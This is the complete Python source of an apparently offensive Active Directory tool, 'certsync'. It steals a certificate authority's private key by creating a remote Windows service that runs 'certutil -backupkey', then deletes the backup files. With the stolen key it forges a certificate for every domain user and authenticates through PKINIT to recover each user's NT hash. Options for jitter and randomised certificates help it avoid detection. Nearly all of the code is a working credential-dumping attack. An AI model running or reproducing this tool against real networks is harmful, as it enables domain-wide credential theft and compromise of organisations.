import argparse
import datetime
import importlib.metadata
import logging
import random
import sys
from time import sleep
import traceback
from typing import Dict, List
from tqdm import tqdm

from ldap3.protocol.formatters.formatters import format_sid
from impacket.dcerpc.v5 import rpcrt, scmr
from impacket.examples import logger
from certipy.lib.target import Target, get_kerberos_principal
from certipy.lib.ldap import LDAPEntry, LDAPConnection
from certipy.lib.rpc import get_dce_rpc
from certipy.commands.ca import CA
from certipy.commands.auth import Authenticate
from certipy.lib.certificate import (
    PRINCIPAL_NAME,
    UTF8String,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    cert_id_to_parts,
    create_pfx,
    encoder,
    generate_rsa_key,
    get_subject_from_str,
    load_pfx,
    x509,
)

class User:
    def __init__(self, samaccountname, sid, domain):
        self.domain = domain
        self.samaccountname = samaccountname
        self.sid = sid
        self.key = None
        self.cert = None
        self.nthash = ""
        self.lmhash = ""

    def to_str(self):
        return "%s/%s:%s:%s:%s:::" % (self.domain,self.samaccountname, self.sid, self.lmhash, self.nthash)

    def forge_cert(self, key, cert, ca_key, ca_cert):
        alt_upn = self.samaccountname
        subject = get_subject_from_str(
                    "CN=%s" % cert_id_to_parts([("UPN", alt_upn)])[0]
                )
        cert = cert.subject_name(subject)
        sans = []
        signature_hash_algorithm = ca_cert.signature_hash_algorithm.__class__
        if isinstance(alt_upn,str):
                alt_upn = alt_upn.encode()
        alt_upn = encoder.encode(UTF8String(alt_upn))
        sans.append(x509.OtherName(PRINCIPAL_NAME, alt_upn))

        cert = cert.add_extension(
            x509.SubjectAlternativeName(sans),
            False,
        )
        cert = cert.sign(ca_key, signature_hash_algorithm())

        self.cert = cert
        self.key = key

    def auth(self, target):
        auth = Authenticate(target=target)
        auth.cert = self.cert
        auth.key = self.key
        auth.no_save = True
        return self.authenticate(auth=auth)

    def authenticate(self, auth:Authenticate):
        id_type = None
        identification = None
        object_sid = None

        identifications = get_identifications_from_certificate(self.cert)

        id_type, identification = identifications[0]

        object_sid = get_object_sid_from_certificate(self.cert)

        domain = self.domain.lower()
        username = self.samaccountname.lower()
        upn = "%s@%s" % (username, domain)

        if auth.target.target_ip is None:
            auth.target.target_ip = auth.target.resolver.resolve(domain)

        if auth.kerberos_authentication(
            username,
            domain,
            False,
            id_type,
            identification,
            object_sid,
            upn,
        ):
            self.lmhash = auth.lm_hash
            self.nthash = auth.nt_hash
            return True
        else:
            return False

class CertSync:
    def __init__(self, options: argparse.Namespace):
        self.options = options
        self.target = Target.create(
            domain = options.domain,
            username = options.username,
            password = options.password,
            dc_ip = options.dc_ip,
            dns_tcp = options.dns_tcp,
            do_kerberos = options.k,
            hashes = options.hashes,
            no_pass = options.no_pass,
            ns = options.ns,
            aes = options.aesKey,
            target_ip = options.dc_ip,
            remote_name = options.kdcHost)

        self.ca_ip = options.ca_ip
        self.user_search_filter = options.ldap_filter
        self.scheme = options.scheme
        self.timeout = options.timeout
        self.jitter = options.jitter
        self.randomize = options.randomize
        self.outputfile = None

        self.ca_pfx = None
        self.ca_key = None
        self.ca_cert = None
        self.ca_p12 = None
        self.file = None
        self.template_pfx = None
        self.template_key = None
        self.template_cert = None
        self.ca_name = None
        self.ca_dns_name = None
        self.ca_ip_addres = None

        self.ldap_connection = None

        if options.outputfile is not None:
            self.outputfile = open(options.outputfile, "w")
        
        if options.ca_pfx is not None:
            with open(options.ca_pfx, "rb") as f:
                self.ca_pfx = f.read()
        
        if options.template is not None:
            with open(options.template, "rb") as f:
                self.template_pfx = f.read()
                self.template_key, self.template_cert = load_pfx(self.template_pfx)
        if options.k:
            principal = get_kerberos_principal()
            if principal:
                self.target.username, self.target.domain = principal
                if self.target.remote_name is None:
                    raise Exception("You need to specify -kdcHost option")

    def init_ldap_conn(self):
        self.ldap_connection = LDAPConnection(target=self.target, scheme=self.scheme)
        self.ldap_connection.connect()

    def run(self):
        logging.getLogger("impacket").disabled = True
        logging.getLogger("certipy").disabled = True

        # 1. Looting LDAP
        logging.info("Collecting userlist, CA info and CRL on LDAP")
        self.init_ldap_conn()

        users = self.get_users(search_filter = self.user_search_filter)
        if len(users) < 1:
            logging.error("No users found in LDAP with %s search filter" % self.user_search_filter)
            sys.exit(1)
        logging.info("Found %s users in LDAP" % len(users))

        ca = None
        cas = self.get_certificate_authorities()
        if len(cas) < 1:
            logging.error("No CA found in LDAP")
            sys.exit(1)
        if len(cas) > 1:
            logging.error("Too much CA, need to select one specific")
            while True:
                logging.info("Please select one:")
                for i, ca_tmp in enumerate(cas):
                    print("\t[%d] %s at %s" % (i, ca_tmp.get("name"), ca_tmp.get("dNSHostName")))
                idx = int(input("> "))
                if idx >= len(cas):
                    logging.warning("Invalid index")
                else:
                    ca = cas[idx]
                    break
        else:
            ca = cas[0]
            
        self.ca_name = ca.get("name")
        self.crl = self.get_crl(self.ca_name)[0].get("distinguishedName")
        
        # 2. Dumping CA PKI
        if self.ca_pfx is None:
            self.ca_dns_name = ca.get("dNSHostName")
            self.ca_ip_address = self.target.resolver.resolve(self.ca_dns_name)
            logging.info("Found CA %s on %s(%s)" % (self.ca_name, self.ca_dns_name, self.ca_ip_address))
            logging.info("Dumping CA certificate and private key")
            ca_target = Target.create(
                domain = self.target.domain,
                username = self.target.username,
                password = self.target.password,
                dc_ip = self.target.dc_ip,
                do_kerberos = self.target.do_kerberos,
                hashes = self.options.hashes,
                aes = self.target.aes,
                remote_name = self.ca_dns_name,
                no_pass = self.options.no_pass)

            ca_module = CA(target=ca_target, ca=self.ca_name)
            self.backup_ca_pki(ca_module)
        else:
            logging.info("Loading CA certificate and private key from %s" % self.options.ca_pfx)
            self.ca_key, self.ca_cert = load_pfx(self.ca_pfx)

        if self.ca_key is None or self.ca_cert is None:
            logging.error("No CA certificate and private key loaded (backup failed or -ca-pfx is not valid). Abort...")
            sys.exit(1)

        # 3. Forge certificates for each users
        logging.info("Forging certificates%sfor every users. This can take some time..." % (("based on %s " % self.options.template) if self.template_pfx is not None else " "))
        if self.randomize:
            for user in (tqdm(users.values()) if self.options.debug else users.values()):
                base_user_key, base_user_cert = self.forge_cert_base()
                try:
                    user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
                except Exception:
                    pass
        else:
            base_user_key, base_user_cert = self.forge_cert_base()
            for user in (tqdm(users.values()) if self.options.debug else users.values()):
                try:
                    user.forge_cert(key=base_user_key, cert=base_user_cert, ca_key=self.ca_key, ca_cert=self.ca_cert)
                except Exception:
                    pass

        # 4. PKINIT every users
        logging.info("PKINIT + UnPAC the hashes")
        synced = 0
        not_synced = 0
        
        for user in users.values():
            sleep(self.timeout + random.randint(0,self.jitter))
            try:
                if user.auth(target=self.target):
                    synced += 1
                    secretsdump = user.to_str()
                    print(secretsdump)
                    if self.outputfile is not None:
                        self.outputfile.write(secretsdump + "\n")
                else:
                    not_synced += 1
            except Exception:
                pass
        logging.debug("%s users dumped. %s users could not be dumped." % (synced, not_synced))

    def forge_cert_base(self):
        key = generate_rsa_key(2048)
        serial_number = x509.random_serial_number()
        cert = x509.CertificateBuilder()
        cert = cert.issuer_name(self.ca_cert.subject)
        cert = cert.public_key(key.public_key())
        cert = cert.serial_number(serial_number)
        cert = cert.not_valid_before(
            datetime.datetime.utcnow() - datetime.timedelta(days=1)
        )
        cert = cert.not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        )

        cert = cert.add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(self.ca_key.public_key()),
            False,
        )

        if self.template_pfx is None:
            cert = cert.add_extension(
                x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
                False,
            )

        crl = x509.CRLDistributionPoints(
                [
                    x509.DistributionPoint(
                        full_name=[x509.UniformResourceIdentifier(self.crl)],
                        relative_name=None,
                        reasons=None,
                        crl_issuer=None,
                    )
                ])
        cert = cert.add_extension(crl, False)

        if self.template_pfx is not None:
            skip_extensions = [
                x509.AuthorityKeyIdentifier.oid,
                x509.SubjectAlternativeName.oid,
                x509.ExtendedKeyUsage.oid,
                x509.CRLDistributionPoints.oid,
            ]

            extensions = self.template_cert.extensions
            for extension in extensions:
                if extension.oid in skip_extensions:
                    continue
                cert = cert.add_extension(extension.value, extension.critical)
        
        return key, cert


    def backup_ca_pki(self, ca_module):
        dce = get_dce_rpc(
            scmr.MSRPC_UUID_SCMR,
            r"\pipe\svcctl",
            ca_module.target,
            timeout=ca_module.timeout,
            dynamic=ca_module.dynamic,
            verbose=ca_module.verbose,
            auth_level_np=rpcrt.RPC_C_AUTHN_LEVEL_NONE,
        )

        if dce is None:
            logging.error(
                "Failed to connect to Service Control Manager Remote Protocol"
            )
            return False

        res = scmr.hROpenSCManagerW(dce)
        handle = res["lpScHandle"]

        config = " -config %s" % ca_module.config if ca_module.config else ""

        cmd = (
            r"cmd.exe /c certutil %s -backupkey -f -p certipy C:\Windows\Tasks\Certipy && move /y C:\Windows\Tasks\Certipy\* C:\Windows\Tasks\certipy.pfx"
            % config
        )

        logging.debug("Creating new service")
        try:
            resp = scmr.hRCreateServiceW(
                dce,
                handle,
                "Certipy",
                "Certipy",
                lpBinaryPathName=cmd,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )

            service_handle = resp["lpServiceHandle"]
        except Exception as e:
            if "ERROR_SERVICE_EXISTS" in str(e):
                resp = scmr.hROpenServiceW(dce, handle, "Certipy")

                service_handle = resp["lpServiceHandle"]

                resp = scmr.hRChangeServiceConfigW(
                    dce,
                    service_handle,
                    lpBinaryPathName=cmd,
                )
            else:
                raise e

        logging.debug("Creating backup")
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception:
            pass

        logging.debug("Retrieving backup")
        try:
            self.ca_p12 = ca_module.get_backup()

            self.ca_key, self.ca_cert = load_pfx(self.ca_p12, b"certipy")
            self.ca_pfx = create_pfx(self.ca_key, self.ca_cert)
        except Exception as e:
            logging.error("Backup failed: %s" % e)

        logging.debug("Cleaning up")

        cmd = r"cmd.exe /c del /f /q C:\Windows\Tasks\Certipy\* && rmdir C:\Windows\Tasks\Certipy"

        resp = scmr.hRChangeServiceConfigW(
            dce,
            service_handle,
            lpBinaryPathName=cmd,
        )

        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception:
            pass

        scmr.hRDeleteService(dce, service_handle)
        scmr.hRCloseServiceHandle(dce, service_handle)
        return True

    def get_users(
        self,
        search_filter,
    ) -> Dict[int, User]:
        users_entries = self.ldap_connection.search(
            search_filter=search_filter,
            attributes=["objectSid","sAMAccountName"],
        )

        users = dict()

        for user in users_entries:
            sid = int(format_sid(user.get_raw('objectSid')[0]).split('-')[-1])
            users[sid] =(User(
                domain= self.target.domain,
                samaccountname = user.get('sAMAccountName'),
                sid=sid))
        
        return dict(sorted(users.items()))
        
    def get_certificate_authorities(self) -> "List[LDAPEntry]":
        cas = self.ldap_connection.search(
            "(&(objectClass=pKIEnrollmentService))",
            search_base="CN=Enrollment Services,CN=Public Key Services,CN=Services,%s"
            % self.ldap_connection.configuration_path,
            attributes=[
                "name",
                "dNSHostName",
            ],
        )

        return cas

    def get_crl(self, ca_name) -> "List[LDAPEntry]":
        crl = self.ldap_connection.search(
            "(&(objectClass=cRLDistributionPoint)(name=%s))" % ca_name,
            search_base="CN=CDP,CN=Public Key Services,CN=Services,%s"
            % self.ldap_connection.configuration_path,
            attributes=[
                "distinguishedName",
            ],
        )

        return crl
    

def main() -> None:
    logger.init()
    version = importlib.metadata.version("certsync")
    parser = argparse.ArgumentParser(description=f"Dump NTDS with golden certificates and UnPAC the hash.\nVersion: {version}", add_help=True)
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument(
        "-outputfile",
        action="store",
        metavar="OUTPUTFILE",
        help="base output filename",
        required=False,
    )

    ca_group = parser.add_argument_group("CA options")
    ca_group.add_argument(
        "-ca-pfx",
        action="store",
        metavar="pfx/p12 file name",
        help="Path to CA certificate. If used, will skip backup of CA certificate and private key",
        required=False,
    )

    ca_group.add_argument(
        "-ca-ip",
        action="store",
        metavar="ip address",
        help=(
            "IP Address of the certificate authority. If omitted it will use the domain"
            "part (FQDN) specified in LDAP"
        ),
    )

    authentication_group = parser.add_argument_group("authentication options")

    authentication_group.add_argument(
        "-d",
        "-domain",
        metavar="domain.local",
        dest="domain",
        action="store",
        help="Domain name",
    )

    authentication_group.add_argument(
        "-u",
        "-username",
        metavar="username",
        dest="username",
        action="store",
        help="Username",
    )

    authentication_group.add_argument(
        "-p",
        "-password",
        metavar="password",
        dest="password",
        action="store",
        help="Password",
    )
    
    authentication_group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    authentication_group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    
    authentication_group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    authentication_group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    authentication_group.add_argument("-kdcHost", help="FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    
    connection_group = parser.add_argument_group("connection options")
    connection_group.add_argument(
        "-scheme",
        action="store",
        metavar="ldap scheme",
        choices=["ldap", "ldaps"],
        default="ldaps",
    )
    connection_group.add_argument(
        "-ns",
        action="store",
        metavar="nameserver",
        help="Nameserver for DNS resolution",
    )
    connection_group.add_argument(
        "-dns-tcp", action="store_true", help="Use TCP instead of UDP for DNS queries"
    )
    connection_group.add_argument(
        "-dc-ip",
        action="store",
        required=True,
        metavar="ip address",
        help=(
            "IP Address of the domain controller. If omitted it will use the domain "
            "part (FQDN) specified in the target parameter"
        ),
    )

    opsec_group = parser.add_argument_group("OPSEC options")

    opsec_group.add_argument(
        "-ldap-filter",
        action="store",
        metavar="LDAP_FILTER",
        help="ldap filter to dump users. Default is (&(|(objectCategory=person)(objectClass=computer))(objectClass=user))",
        default="(&(|(objectCategory=person)(objectClass=computer))(objectClass=user))",
        required=False,
    )

    opsec_group.add_argument(
        "-template",
        action="store",
        metavar="cert.pfx",
        dest="template",
        help="base template to use in order to forge certificates",
        required=False,
    )

    opsec_group.add_argument(
        "-timeout",
        metavar="timeout",
        dest="timeout",
        action="store",
        type=int,
        default=0,
        help="Timeout between PKINIT connection",
    )

    opsec_group.add_argument(
        "-jitter",
        metavar="jitter",
        dest="jitter",
        action="store",
        type=int,
        default=0,
        help="Jitter between PKINIT connection",
    )

    opsec_group.add_argument(
        "-randomize",
        action="store_true",
        help="Randomize certificate generation. Takes longer to generate all the certificates",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)

    try:
        certsync = CertSync(options=options)
        certsync.run()
    except Exception as e:
        logging.error("Got error: %s" % e)
        if options.debug:
            traceback.print_exc()
        else:
            logging.error("Use -debug to print a stacktrace")

if __name__ == "__main__":
    main()
